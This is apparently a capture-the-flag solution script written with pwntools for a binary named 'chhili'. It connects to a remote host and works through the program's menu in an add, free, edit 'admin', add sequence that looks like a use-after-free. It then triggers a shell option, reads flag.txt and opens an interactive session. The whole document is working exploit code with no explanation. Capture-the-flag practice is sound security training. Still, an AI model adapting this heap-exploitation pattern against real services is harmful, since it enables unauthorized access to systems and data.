from pwn import *
#p=process('./chhili')
p=remote('40.71.72.198',1234)
elf = ELF('./chhili')
#raw_input("DEBUG")
def add(size,data):
	p.sendlineafter(">> ","1")
	p.sendlineafter("size : \n",str(size))
	p.sendlineafter("data : \n",str(data))
	print "add"

def free():
	p.sendlineafter(">> ","2")

def edit(data):
	p.sendlineafter(">> ","3")
	p.sendlineafter("data : \n",str(data))
	print "edit"

def shell():
	p.sendlineafter(">> ","4")
	p.sendline("cat flag.txt")

add(20,"a"*20)
free()
edit("admin")
add(30,"b"*30)
shell()


p.interactive()